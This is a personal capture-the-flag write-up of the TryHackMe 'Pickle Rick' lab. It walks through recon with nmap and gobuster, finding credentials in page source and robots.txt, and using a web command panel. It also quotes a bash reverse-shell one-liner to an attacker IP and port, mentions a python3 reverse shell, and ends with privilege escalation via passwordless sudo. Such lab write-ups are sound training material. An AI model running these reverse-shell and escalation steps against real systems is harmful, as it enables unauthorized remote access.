---
title: Pickle Rick CTF
parent: THM Boxes
grand_parent: Pwn Counter
nav_order: 17
---

# Pickle Rick CTF



## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Box Description

> Find the ingredients (flags) to turn rick back into a human

## Recon

As always, I satrted off with an nmap scan using ```nmap -sC -sV -vv ip``` which revealed ssh on ```port 20``` and a webs erver hosted on port ```80```.

Visiting the page, we are greeted with a call for help from rick ಥ_ಥ

<img width="1237" height="565" alt="image" src="https://github.com/user-attachments/assets/95d4fee9-d561-44a6-ad5e-f34104cabf1c" />

Before clicking around the page, I set up a gobuster scan using the command ```gobuster dir http://ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -x php,html,txt```

While I let that run in the background, I decided to check the source of the html page and found a note from rick to remind himself of his username

<img width="248" height="107" alt="image" src="https://github.com/user-attachments/assets/c35030e0-8e55-44d1-a4e4-7578ea78b986" />

Now having a username, I began hunting for a password.

I checked my gobuster scan and found some notable finds such as a login.php and a robots.txt.

Navigating to robots.txt I found a single string: ```Wubbalubbadubdub```.

Saving this in my notes as a potential password, I went to the login page, tried the credentials I had found, and I was successfully logged in, nice 😎

Upon logging in, you are greeted by a command portal, and dont have access to any other tabs

<img width="1215" height="253" alt="image" src="https://github.com/user-attachments/assets/31033484-e11a-4299-90f4-68c3a6b9c697" />

Just to test it out, I did ```ls``` and was saw the files in the var/www/html directory

<img width="1229" height="187" alt="image" src="https://github.com/user-attachments/assets/766c9c06-64d3-466e-8a50-603f5a82700d" />

I tried to cat out the first flag but I got trolled and it sadi I couldn't use the cat command because it was removed to make things harder, but less worked.

I also read the clue file and it just said to look around, cool.

I tried sudo -l and found I was able to run sudo for everything with no password as www-data.

I was getting tired of doing all my work through the command panel and concatenatingdifferent commadns with ```&&``` so I tried to establish a reverse shell  to make things go faster.

A bash reverse shell didn't work and thats because the reverse shell i used (```sh -i >& /dev/tcp/IP/PORT 0>&1```) used bash which needs /dev/tcp/ which when I got on the machine with my eventual reverse shell found out that /dev/tcp wasnt even on the machine (```(echo > /dev/tcp/127.0.0.1/1) 2>&1
sh: 1: cannot create /dev/tcp/127.0.0.1/1: Directory nonexistent
$```) so bash had no way of being able to establish a reverse shell.

I was so confused why bash wasnt working and I ended up finding out from John Hammond's writeup that python3 was on the machine and so I switched over to a python3 reverse shell and flawless, I wish I would have enumerated more before resorting to the writeup because I feel I would have found that.

Now with the reverse shell I was able to explore the machine quicker.

I went to the home directory, found rick's user profile, and found the second secret ingredient. Nice, one to go.

I assumed the last ingredient would be in the root directory so I looked for suid bit binaries using the command ```find / -perm -u=s -type f 2>/dev/null```.

After cross referencing a couple binaries with GTFObins, I realized I was overcomplicating things, I was able to run sudo without a password as www-data, which leads me to the exploitation phase (if you can really call it that).



## Exploitation

I ran the command ```sudo su```

## Solution Steps

1.

## Thoughts



--

Thank you for reading!

